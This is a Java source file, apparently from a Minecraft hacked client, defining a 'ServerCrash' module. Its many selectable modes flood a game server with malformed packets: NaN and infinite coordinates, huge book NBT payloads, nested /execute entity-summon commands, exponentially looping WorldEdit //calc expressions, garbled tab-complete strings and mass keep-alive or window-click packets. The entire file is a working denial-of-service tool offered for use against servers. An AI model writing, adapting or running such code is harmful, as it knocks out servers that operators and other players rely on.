
package Method.Client.module.misc;

import Method.Client.managers.Setting;
import Method.Client.module.Category;
import Method.Client.module.Module;
import Method.Client.utils.TimerUtils;
import Method.Client.utils.system.Connection;
import Method.Client.utils.system.Wrapper;
import Method.Client.utils.visual.ChatUtils;
import com.google.common.eventbus.Subscribe;
import io.netty.buffer.Unpooled;
import net.minecraft.entity.Entity;
import net.minecraft.init.Items;
import net.minecraft.inventory.ClickType;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.PacketBuffer;
import net.minecraft.network.login.client.CPacketEncryptionResponse;
import net.minecraft.network.play.client.*;
import net.minecraft.network.play.server.SPacketDisconnect;
import net.minecraft.network.play.server.SPacketJoinGame;
import net.minecraft.network.status.client.CPacketServerQuery;
import net.minecraft.util.EnumFacing;
import net.minecraft.util.EnumHand;
import net.minecraft.util.math.BlockPos;
import net.minecraftforge.fml.common.gameevent.TickEvent;
import org.apache.commons.lang3.RandomStringUtils;
import org.apache.commons.lang3.RandomUtils;
import org.lwjgl.input.Keyboard;

import java.util.Random;

import static Method.Client.Main.setmgr;

public class ServerCrash extends Module {

    /////////////////////

    public ServerCrash() {
        super("ServerCrash", Keyboard.KEY_NONE, Category.MISC, "Server Crash");
    }

    Setting mode = setmgr.add( new Setting("Mode", this, "Velt", "Velt", "Infinity", "Artemis.ac", "Artemis.ac2",
            "LiquidBounce-BookFlood", "Operator", "WorldEdit", "WorldEdit2", "TabComplete", "ItemSwitcher", "KeepAlives", "Animation",
            "Payload", "NewFunction", "Hand", "Swap", "Riding", "Container", "Tp"));

    Setting Packets = setmgr.add( new Setting("Packets", this, 5000, 1, 10000, true));
    Setting AutoDisable = setmgr.add( new Setting("AutoDisable", this, false));

    Setting JustOnce = setmgr.add( new Setting("JustOnce", this, true));


    public static boolean isModeMCBrandModifier;
    public static boolean disableSafeGuard;
    public long longdong = 0L;

    TimerUtils timer = new TimerUtils();

    @Override
    public void onDisable() {
        disableSafeGuard = false;
        isModeMCBrandModifier = false;
        this.longdong = 15000L;
    }

    @Override
    public void onEnable() {
        ChatUtils.warning("This May - Will Crash You!");
        if (mode.getValString().equalsIgnoreCase("Payload")) {
            PacketBuffer packetbuffer = new PacketBuffer(Unpooled.buffer());
            packetbuffer.writeLong(Long.MAX_VALUE);
            for (int i = 0; i < Packets.getValDouble(); i++) {
                Wrapper.INSTANCE.sendPacket(new CPacketCustomPayload("MC|AdvCdm", packetbuffer));
            }
        }
        if (mode.getValString().equalsIgnoreCase("Artemis.ac")) {
            for (int i = 0; i < Packets.getValDouble(); ++i) {
                Wrapper.INSTANCE.sendPacket(new CPacketKeepAlive(0));
            }
        } else if (mode.getValString().equalsIgnoreCase(("Artemis.ac2"))) {
            mc.player.setPositionAndUpdate(mc.player.posX, Double.NaN, mc.player.posZ);
        }

        this.longdong = 15000L;
    }

    @Subscribe
    public void onClientTick(TickEvent.ClientTickEvent event) {
        disableSafeGuard = true;
        new PacketBuffer(Unpooled.buffer().writeByte(Integer.MAX_VALUE));
        int i;
        if (mode.getValString().equalsIgnoreCase(("Container"))) {
            for (i = 0; i < Packets.getValDouble(); ++i) {
                mc.player.connection.sendPacket(new CPacketClickWindow(-2147483648, -2147483648, -2147483648, ClickType.CLONE, null, (short) 1));
                mc.player.connection.sendPacket(new CPacketClickWindow(Integer.MAX_VALUE, Integer.MAX_VALUE, 1, ClickType.CLONE, ItemStack.EMPTY, (short) 1));
                mc.player.connection.sendPacket(new CPacketCloseWindow(-2147483648));
                mc.player.connection.sendPacket(new CPacketCloseWindow(Integer.MAX_VALUE));
            }
        }
        if (mode.getValString().equalsIgnoreCase(("Tp"))) {
            Wrapper.INSTANCE.sendPacket(new CPacketPlayer.Position(Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, (new Random()).nextBoolean()));
            double y = 0;
            double z = 0;
            for (int e = 0; e < Packets.getValDouble(); ) {
                y = e * 9;
                Wrapper.INSTANCE.sendPacket(new CPacketPlayer.Position(mc.player.posX, mc.player.posY + y, mc.player.posZ, (new Random()).nextBoolean()));
                e++;
            }
            for (int bb = 0; bb < Packets.getValDouble() * 10; ) {
                z = bb * 9;
                Wrapper.INSTANCE.sendPacket(new CPacketPlayer.Position(mc.player.posX, mc.player.posY + y, mc.player.posZ + z, (new Random()).nextBoolean()));
                bb++;
            }
        }
        if (mode.getValString().equalsIgnoreCase(("Hand"))) {
            for (i = 0; i < Packets.getValDouble(); ++i) {
                mc.player.connection.sendPacket(new CPacketAnimation(EnumHand.MAIN_HAND));
            }
        }
        if (mode.getValString().equalsIgnoreCase(("Swap"))) {
            for (i = 0; i < Packets.getValDouble(); ++i) {
                mc.player.connection.sendPacket(new CPacketPlayerDigging(CPacketPlayerDigging.Action.SWAP_HELD_ITEMS, BlockPos.ORIGIN, mc.player.getHorizontalFacing()));
            }
        }
        if (mode.getValString().equalsIgnoreCase(("Riding"))) {
            for (i = 0; i < Packets.getValDouble(); ++i) {
                Entity riding = mc.player.getRidingEntity();
                if (riding != null) {
                    riding.posX = mc.player.posX;
                    riding.posY = mc.player.posY + 1337.0D;
                    riding.posZ = mc.player.posZ;
                    mc.player.connection.sendPacket(new CPacketVehicleMove(riding));
                }
            }
        }
        if (mode.getValString().equalsIgnoreCase(("Artemis.ac2"))) {
            for (i = 0; i < Packets.getValDouble(); ++i) {
                Wrapper.INSTANCE.sendPacket(new CPacketPlayer.PositionRotation(Double.NaN, Double.NaN, Double.NaN, Float.NaN, Float.NaN, (new Random()).nextBoolean()));
            }
        } else if (mode.getValString().equalsIgnoreCase(("Artemis.ac"))) {
            for (i = 0; i < Packets.getValDouble(); ++i) {
                Wrapper.INSTANCE.sendPacket(new CPacketKeepAlive(0));
            }
        } else if (mode.getValString().equalsIgnoreCase(("NewFunction"))) {
            for (i = 0; i < Packets.getValDouble(); ++i) {
                Wrapper.INSTANCE.sendPacket(new CPacketEncryptionResponse());
                Wrapper.INSTANCE.sendPacket(new CPacketServerQuery());
            }
        } else if (mode.getValString().equalsIgnoreCase(("Infinity"))) {
            Wrapper.INSTANCE.sendPacket(new CPacketPlayer.Position(Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, (new Random()).nextBoolean()));
            Wrapper.INSTANCE.sendPacket(new CPacketPlayer.Position(Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, (new Random()).nextBoolean()));
        } else if (mode.getValString().equalsIgnoreCase(("Velt"))) {
            if (mc.player.ticksExisted < 100) {
                for (i = 0; i < Packets.getValDouble(); ++i) {
                    Wrapper.INSTANCE.sendPacket(new CPacketPlayer.Position(mc.player.posX, mc.player.posY - 1.0D, mc.player.posZ, false));
                    Wrapper.INSTANCE.sendPacket(new CPacketPlayer.Position(mc.player.posX, Double.MAX_VALUE, mc.player.posZ, false));
                    Wrapper.INSTANCE.sendPacket(new CPacketPlayer.Position(mc.player.posX, mc.player.posY - 1.0D, mc.player.posZ, false));
                }
            }
        } else if (mode.getValString().equalsIgnoreCase(("LiquidBounce-BookFlood"))) {
            String randomString = RandomStringUtils.random(8, "abcdefghijklmnopqrstuvwxyz1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ");
            ItemStack bookStack = new ItemStack(Items.WRITABLE_BOOK);
            NBTTagCompound bookCompound = new NBTTagCompound();
            bookCompound.setString("author", "FileExtension");
            bookCompound.setString("title", "§8§l[§d§lServerCrasher§8§l]");
            NBTTagList pageList = new NBTTagList();

            int packets;
            for (packets = 0; packets < 50; ++packets) {
                pageList.appendTag(new NBTTagString(randomString));
            }

            bookCompound.setTag("pages", pageList);
            bookStack.setTagCompound(bookCompound);

            for (packets = 0; packets < Packets.getValDouble(); ++packets) {
                PacketBuffer packetBuffer = new PacketBuffer(Unpooled.buffer());
                packetBuffer.writeItemStack(bookStack);
                Wrapper.INSTANCE.sendPacket(new CPacketCustomPayload((new Random()).nextBoolean() ? "MC|BSign" : "MC|BEdit", packetBuffer));
            }
        }

        double rand1;
        double rand2;
        double rand3;
        if (mode.getValString().equalsIgnoreCase(("FlexAir"))) {
            for (i = 0; (double) i < Packets.getValDouble(); ++i) {
                rand1 = RandomUtils.nextDouble(0.1D, 1.9D);
                rand2 = RandomUtils.nextDouble(0.1D, 1.9D);
                rand3 = RandomUtils.nextDouble(0.1D, 1.9D);
                int rand4 = RandomUtils.nextInt(0, Integer.MAX_VALUE);
                Wrapper.INSTANCE.sendPacket(new CPacketPlayer.PositionRotation(mc.player.posX + 1257892.0D * rand1, mc.player.posY + 9871521.0D * rand2, mc.player.posZ + 9081259.0D * rand3, mc.player.rotationYaw, mc.player.rotationPitch, (new Random()).nextBoolean()));
                Wrapper.INSTANCE.sendPacket(new CPacketPlayer.PositionRotation(mc.player.posX - 9125152.0D * rand1, mc.player.posY - 1287664.0D * rand2, mc.player.posZ - 4582135.0D * rand3, mc.player.rotationYaw, mc.player.rotationPitch, (new Random()).nextBoolean()));
                Wrapper.INSTANCE.sendPacket(new CPacketKeepAlive(rand4));
            }
        } else if (mode.getValString().equalsIgnoreCase(("TabComplete"))) {
            for (i = 0; (double) i < Packets.getValDouble(); ++i) {
                rand1 = RandomUtils.nextDouble(0.0D, Double.MAX_VALUE);
                rand2 = RandomUtils.nextDouble(0.0D, Double.MAX_VALUE);
                rand3 = RandomUtils.nextDouble(0.0D, Double.MAX_VALUE);
                Wrapper.INSTANCE.sendPacket(new CPacketTabComplete("Ã–Ã–ÃƒÃ�Ã�?Â½Â¼uÂ§}e>?\\\"Ã¨Ã«Ã½Ã¼Ã¹ÃµÃ·Ã¥Ã¢Ã�Å¾Å¸Æ’ÃžÃ–ÃƒÃ�Ã�?Â½Â¼uÂ§}e>?\\\"Ã¨Ã«Ã½Ã¼Ã¹ÃµÃ·Ã¥Ã¢Ã�Å¾Å¸Æ’ÃžÃ–ÃƒÃ�Ã�?Â½Â¼uÂ§}e>?\\\"Ã¨Ã«Ã½Ã¼Ã¹ÃµÃ·Ã¥Ã¢Ã�Å¾Å¸Æ’ÃžÃ–ÃƒÃ�Ã�?Â½Â¼uÂ§}e>?\\\"Ã¨Ã«Ã½Ã¼Ã¹ÃµÃ·Ã¥Ã¢Ã�Å¾Å¸Æ’ÃžÃ–ÃƒÃÃ–ÃƒÃ�Ã�?Â½Â¼uÂ§}e>?\\\"Ã¨Ã«Ã½Ã¼Ã¹ÃµÃ·Ã¥Ã¢Ã�Å¾Å¸Æ’ÃžÃ–ÃƒÃ�Ã�?Â½Â¼uÂ§}e>?\\\"Ã¨Ã«Ã½Ã¼Ã¹ÃµÃ·Ã¥Ã¢Ã�Å¾Å¸Æ’ÃžÃ–ÃƒÃ�Ã�?Â½Â¼uÂ§}e>?\\\"Ã¨Ã«Ã½Ã¼Ã¹ÃµÃ·Ã¥Ã¢Ã�Å¾Å¸Æ’ÃžÃ–ÃƒÃ�Ã�?Â½Â¼uÂ§}e>?\\\"Ã¨Ã«Ã½Ã¼Ã¹ÃµÃ·Ã¥Ã¢Ã�Å¾Å¸Æ’ÃžÃ–ÃƒÃ�Ã�?Â½Â¼uÂ§}e>?\\\"Ã¨Ã«Ã½Ã¼Ã¹ÃµÃ·Ã¥Ã¢Ã�Å¾Å¸Æ’ÃžÃ–ÃƒÃ�Ã�?Â½Â¼uÂ§}e>?\\\"Ã¨Ã«Ã½Ã¼Ã¹ÃµÃ·Ã¥Ã¢Ã�Å¾Å¸Æ’Ãž�Ã�?Â½Â¼uÂ§}e>?\\\"Ã¨Ã«Ã½Ã¼Ã¹ÃµÃ·Ã¥Ã¢Ã�Å¾Å¸Æ’ÃžÃƒÃ�Ã�?Â½Â¼uÂ§}e>?\\\"Ã¨Ã«Ã½Ã¼Ã¹ÃµÃ·Ã¥Ã¢Ã�Å¾Å¸Æ’Ãž", new BlockPos(rand1, rand2, rand3), true));
            }
        } else if (mode.getValString().equalsIgnoreCase(("WorldEdit"))) {
            if (mc.player.ticksExisted % 2 == 0) {
                mc.player.sendChatMessage("//calc for(i=0;i<256;i++){for(j=0;j<256;j++){for(k=0;k<256;k++){for(l=0;l<256;l++){ln(pi)}}}}");
                mc.player.sendChatMessage("//calculate for(i=0;i<256;i++){for(j=0;j<256;j++){for(k=0;k<256;k++){for(l=0;l<256;l++){ln(pi)}}}}");
                mc.player.sendChatMessage("//solve for(i=0;i<256;i++){for(j=0;j<256;j++){for(k=0;k<256;k++){for(l=0;l<256;l++){ln(pi)}}}}");
                mc.player.sendChatMessage("//evaluate for(i=0;i<256;i++){for(j=0;j<256;j++){for(k=0;k<256;k++){for(l=0;l<256;l++){ln(pi)}}}}");
                mc.player.sendChatMessage("//eval for(i=0;i<256;i++){for(j=0;j<256;j++){for(k=0;k<256;k++){for(l=0;l<256;l++){ln(pi)}}}}");
            }
        } else if (mode.getValString().equalsIgnoreCase(("DEV"))) {
            for (i = 0; (double) i < Packets.getValDouble(); ++i) {
                Wrapper.INSTANCE.sendPacket(new CPacketCustomPayload("REGISTER", (new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256))).writeString("Ã–ÃƒÃ�Ã�?Â½Â¼uÂ§}e>?\"Ã¨Ã«Ã½Ã¼Ã¹ÃµÃ·Ã¥Ã¢Ã�Å¾Å¸Æ’Ãž")));
                Wrapper.INSTANCE.sendPacket(new CPacketCustomPayload("MC|Brand", (new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256))).writeString("Ã–ÃƒÃ�Ã�?Â½Â¼uÂ§}e>?\"Ã¨Ã«Ã½Ã¼Ã¹ÃµÃ·Ã¥Ã¢Ã�Å¾Å¸Æ’Ãž")));
                Wrapper.INSTANCE.sendPacket(new CPacketCustomPayload("REGISTER", (new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256))).writeString("Ã–ÃƒÃ�Ã�?Â½Â¼uÂ§}e>?\"Ã¨Ã«Ã½Ã¼Ã¹ÃµÃ·Ã¥Ã¢Ã�Å¾Å¸Æ’Ãž")));
                Wrapper.INSTANCE.sendPacket(new CPacketCustomPayload("MC|BOpen", (new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256))).writeString("Ã–ÃƒÃ�Ã�?Â½Â¼uÂ§}e>?\"Ã¨Ã«Ã½Ã¼Ã¹ÃµÃ·Ã¥Ã¢Ã�Å¾Å¸Æ’Ãž")));
                Wrapper.INSTANCE.sendPacket(new CPacketCustomPayload("REGISTER", (new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256))).writeString("Ã–ÃƒÃ�Ã�?Â½Â¼uÂ§}e>?\"Ã¨Ã«Ã½Ã¼Ã¹ÃµÃ·Ã¥Ã¢Ã�Å¾Å¸Æ’Ãž")));
                Wrapper.INSTANCE.sendPacket(new CPacketCustomPayload("MC|TrList", (new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256))).writeString("Ã–ÃƒÃ�Ã�?Â½Â¼uÂ§}e>?\"Ã¨Ã«Ã½Ã¼Ã¹ÃµÃ·Ã¥Ã¢Ã�Å¾Å¸Æ’Ãž")));
                Wrapper.INSTANCE.sendPacket(new CPacketCustomPayload("REGISTER", (new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256))).writeString("Ã–ÃƒÃ�Ã�?Â½Â¼uÂ§}e>?\"Ã¨Ã«Ã½Ã¼Ã¹ÃµÃ·Ã¥Ã¢Ã�Å¾Å¸Æ’Ãž")));
                Wrapper.INSTANCE.sendPacket(new CPacketCustomPayload("MC|TrSel", (new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256))).writeString("Ã–ÃƒÃ�Ã�?Â½Â¼uÂ§}e>?\"Ã¨Ã«Ã½Ã¼Ã¹ÃµÃ·Ã¥Ã¢Ã�Å¾Å¸Æ’Ãž")));
                Wrapper.INSTANCE.sendPacket(new CPacketCustomPayload("REGISTER", (new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256))).writeString("Ã–ÃƒÃ�Ã�?Â½Â¼uÂ§}e>?\"Ã¨Ã«Ã½Ã¼Ã¹ÃµÃ·Ã¥Ã¢Ã�Å¾Å¸Æ’Ãž")));
                Wrapper.INSTANCE.sendPacket(new CPacketCustomPayload("MC|BEdit", (new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256))).writeString("Ã–ÃƒÃ�Ã�?Â½Â¼uÂ§}e>?\"Ã¨Ã«Ã½Ã¼Ã¹ÃµÃ·Ã¥Ã¢Ã�Å¾Å¸Æ’Ãž")));
                Wrapper.INSTANCE.sendPacket(new CPacketCustomPayload("REGISTER", (new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256))).writeString("Ã–ÃƒÃ�Ã�?Â½Â¼uÂ§}e>?\"Ã¨Ã«Ã½Ã¼Ã¹ÃµÃ·Ã¥Ã¢Ã�Å¾Å¸Æ’Ãž")));
                Wrapper.INSTANCE.sendPacket(new CPacketCustomPayload("MC|BSign", (new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256))).writeString("Ã–ÃƒÃ�Ã�?Â½Â¼uÂ§}e>?\"Ã¨Ã«Ã½Ã¼Ã¹ÃµÃ·Ã¥Ã¢Ã�Å¾Å¸Æ’Ãž")));
            }
        } else if (mode.getValString().equalsIgnoreCase(("Operator"))) {
            for (i = 0; i < Packets.getValDouble(); ++i) {
                mc.player.sendChatMessage("/execute @e ~ ~ ~ execute @e ~ ~ ~ execute @e ~ ~ ~ execute @e ~ ~ ~ summon Villager");
            }
        } else if (mode.getValString().equalsIgnoreCase(("MC|BrandModifier"))) {
            isModeMCBrandModifier = true;
        } else {
            int r;
            if (!mode.getValString().equalsIgnoreCase(("ItemSwitcher"))) {
                if (mode.getValString().equalsIgnoreCase(("KitmapSignInteract"))) {
                    for (i = 0; (double) i < Packets.getValDouble(); ++i) {
                        mc.rightClickMouse();
                        Wrapper.INSTANCE.sendPacket(new CPacketPlayerDigging(CPacketPlayerDigging.Action.DROP_ALL_ITEMS, new BlockPos(mc.player.posX, mc.player.posY, mc.player.posZ), EnumFacing.UP));
                    }
                } else if (mode.getValString().equalsIgnoreCase(("WorldEdit2"))) {
                    for (i = 0; (double) i < Packets.getValDouble(); ++i) {
                        Wrapper.INSTANCE.sendPacket(new CPacketCustomPayload("WECUI", (new PacketBuffer(Unpooled.buffer())).writeString("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n")));
                    }
                } else if (mode.getValString().equalsIgnoreCase(("KeepAlives"))) {
                    for (i = 0; (double) i < Packets.getValDouble(); ++i) {
                        r = RandomUtils.nextInt(0, 0);
                        Wrapper.INSTANCE.sendPacket(new CPacketKeepAlive(r));
                    }
                } else if (mode.getValString().equalsIgnoreCase(("Animation"))) {
                    for (i = 0; (double) i < Packets.getValDouble(); ++i) {
                        mc.player.connection.sendPacket(new CPacketAnimation());
                    }
                }
            } else {
                for (i = 0; (double) i < Packets.getValDouble(); ++i) {
                    for (r = 0; r < 8; ++r) {
                        Wrapper.INSTANCE.sendPacket(new CPacketHeldItemChange(r));
                    }
                }
            }
        }

        if (this.timer.isDelay(this.longdong) && AutoDisable.getValBoolean()) {
            this.setToggled(false);
            this.timer.setLastMS();
        }

        if (JustOnce.getValBoolean() && !mode.getValString().equalsIgnoreCase(("MC|BrandModifier"))) {
            this.setToggled(false);
        }

    }

    @Override
    public boolean onPacket(Object packet, Connection.Side side) {
        if (mode.getValString().equalsIgnoreCase(("MC|BrandModifier"))) {
            if (packet instanceof CPacketCustomPayload) {
                CPacketCustomPayload C17 = (CPacketCustomPayload) packet;
                C17.channel = "MC|Brand";
                C17.data = (new PacketBuffer(Unpooled.buffer())).writeString("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n");
            }
        }

        if (this.timer.isDelay(this.longdong) && AutoDisable.getValBoolean()) {
            if (packet instanceof SPacketJoinGame) {
                this.setToggled(false);
            }
            if (packet instanceof SPacketDisconnect) {
                this.setToggled(false);
            }
        }
        return true;
    }


}
